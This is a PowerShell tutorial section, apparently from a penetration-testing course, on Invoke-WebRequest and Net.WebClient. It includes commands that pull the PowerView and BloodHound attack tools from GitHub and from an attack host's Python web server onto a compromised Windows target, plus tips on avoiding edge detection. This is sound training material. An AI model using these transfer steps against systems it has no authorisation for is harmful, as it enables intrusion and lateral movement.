<h3>Interacting With The Web</h3>

As an administrator, we can automate how we perform remote updates, install applications, and much more with tools and cmdlets through PowerShell. This will ensure that we can get the software, updates, and other objects we need on hosts locally and remotely without manually browsing for them via the GUI. This will save us time and enable us to remotely administer the hosts instead of sitting at its keyboard or RDP'ing in. As a pentester, this is a quick way to get tools and other items we need into the environment and to exfiltrate data if we have the infrastructure to send it to. This section will cover how we interact with the web and show several ways to utilize PowerShell to serve this purpose.

<h3>How Do We Interact With The Web Using PowerShell?</h3>

When it comes to interacting with the web via PowerShell, the Invoke-WebRequest cmdlet is our champion. We can use it to perform basic HTTP/HTTPS requests (like GET and POST), parse through HTML pages, download files, authenticate, and even maintain a session with a site. It's very versatile and easy to use in scripting and automation. If you prefer aliases, the Invoke-WebRequest cmdlet is aliased to wget, iwr and curl. Those familiar with Linux Fundamentals may be familiar with cURL and wget, as they are used to download files from the command line in Linux distributions. Let's look at the help from Invoke-WebRequest for a minute.

<h3>Invoke-WebRequest Help</h3>

PS C:\Windows\system32> Get-Help Invoke-Webrequest

Notice in the synopsis from the Get-Help output it states:

"Gets content from a web page on the Internet."

While this is the core functionality, we can also use it to get content that we host on web servers in the same network environment. We have talked it up, and now let's try and do a simple web request using Invoke-WebRequest.

<h3>A Simple Web Request</h3>

We can perform a basic Get request of a website using the -Method GET modifier with the Invoke-WebRequest cmdlet, as seen below. We will specify the URI as https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html for this example. We will also send it to Get-Member to inspect the object's output methods and properties.

<h3>Get Request with Invoke-WebRequest</h3>

PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member

Notice all the different properties this site has. We can now filter on those if we wish to show only a portion of the site. For example, what if we just wanted to see a listing of the images on the site? We can do that by performing the request and then filtering for just Images like so:

<h3>Filtering Incoming Content</h3>

PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images

Now we have an easy-to-read list of the images included in the website, and we can download them if we want. This is a super easy way only to get the information we wish to see. The raw content of the website we are enumerating looks like this:

<h3>Raw Content</h3>

PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent

We could carve out this site's raw content instead of looking at everything from the request all at once. Notice how much easier it is to read? As a quick way to recon a website or pull key information out, such as names, addresses, and emails, it doesn't get much easier than this. Where Invoke-WebRequest gets handy is its ability to download files via the CLI. Let's look at downloading files now.

<h3>Downloading Files using PowerShell</h3>

Whether performing sys admin, pentesting engagement, or disaster recovery-related tasks, files of all kinds will inevitably need to be downloaded to a Windows host. On a pentesting engagement, we may have compromised a target and want to transfer tools onto that host to enumerate the environment further and identify ways to get to other hosts & networks. PowerShell gives us some built-in options to do this. We will be focusing on Invoke-WebRequest for this module, but understand there are many different ways (some it's what they were meant for, others are unintentional by the tool creators) we could perform web requests and downloads.

<h3>Downloading PowerView.ps1 from GitHub</h3>

We can practice using Invoke-WebRequest by downloading a popular tool used by many pentesters called PowerView.

<h3>Download To Our Host</h3>

PS C:\> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"

PS C:\> dir

    Directory: C:\

Mode LastWriteTime Length Name

---

d----- 6/5/2021 5:10 AM PerfLogs

d-r--- 7/25/2022 7:36 AM Program Files

d-r--- 6/5/2021 7:37 AM Program Files (x86)

d-r--- 7/30/2022 10:21 AM Users

d----- 7/21/2022 11:28 AM Windows

-a---- 8/10/2022 9:12 AM 7299504 PowerView.ps1

Using Invoke-WebRequest is simple; we specify the cmdlet and the exact URL of a resource we want to download:

-Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"

After the URL, we specify the location and file name of the resource on the Windows system we are downloading it from:

-OutFile "C:\PowerView.ps1"

We can also use Invoke-WebRequest to download files from web servers on the local network or a network reachable from the Windows target. It is common to find the need to transfer files from our attack host to a Windows target. One benefit to doing this would be if one of our goals during a pentest is to remain as stealthy as possible, we may not need to generate requests to the Internet that network security appliances could detect at the edge of the network. If we already had PowerView.ps1 stored on our attack host we could use a simple python web server to host PowerView.ps1 and download it from the target.

<h3>Example Path to Bring Tools Into an Environment</h3>

If we already had PowerView.ps1 stored on our attack host we could use a simple Python web server to host PowerView.ps1 and download it from the target. From the attack host, we want to confirm that the file is already present or we need to download it. In this example, we can assume it is already on the attack host for demonstration purposes.

<h3>Using ls to View the File (Attack Host)</h3>

@htb[/htb]$ ls

We start a simple python web server in the directory where PowerView.ps1 is located.

<h3>Starting the Python Web Server (Attack Host)</h3>

@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Then, we would download the hosted file from the attack host using Invoke-WebRequest.

<h3>Downloading PowerView.ps1 from Web Server (From Attack Host to Target Host)</h3>

Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"

As discussed previously, we can use the Invoke-WebRequest cmdlet to send commands to remote hosts. This can be pretty useful, especially when we discover vulnerabilities that allow us to execute commands on a Windows target but may not have access via an interactive shell or remote desktop session. This could allow us to download files onto the target host, allowing us to further our access to that target and move to others on the network. File transfer methods are covered in greater detail in the module File Transfers.

<h3>What If We Can't Use Invoke-WebRequest?</h3>

So what happens if we are restricted from using Invoke-WebRequest for some reason? Not to fear, Windows provides several different methods to interact with web clients. The first and more challenging interaction path is utilizing the .Net.WebClient class. This handy class is a .Net call we can utilize as Windows uses and understands .Net. This class contains standard system.net methods for interacting with resources via a URI (web addresses like github.com/project/tool.ps1). Let's look at an example:

<h3>Net.WebClient Download</h3>

PS C:\htb> (New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")

PS C:\htb> ls

So it worked. Let's break down what we did:

- First we have the Download cradle (New-Object Net.WebClient).DownloadFile(), which is how we tell it to execute our request.

- Next, we need to include the URI of the file we want to download as the first parameter in the (). For this example, that was "https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip".

- Finally, we need to tell the command where we want the file written to with the second parameter , "BloodHound.zip".

The command above would have downloaded the file to the current directory we are working from as Bloodhound.zip. Looking at our terminal, we can see that it executed successfully because the file Bloodhound.zip now exists in our working directory. If we wanted to place it somewhere else, we would have to specify the full path. From here, we can extract the tools and run them as we see fit. Keep in mind this is noisy because you will have web requests entering and leaving your network along with file reads and writes, so it WILL leave logs. If your transfers are done locally, only host to host, for example, you only leave logs on those hosts, which are a bit harder to sift through and leave less of a trace since we aren't writing ingress/egress logs at the customer boundary.

<h3>Wrapping Up</h3>

This section has only scratched the surface of what we could do with PowerShell when interacting with the web. Be sure to take some time and practice the different types of requests you can send and even the many different ways you can filter and use the information you get. From this point, we will move on and talk about automation with PowerShell and how it can benefit us.
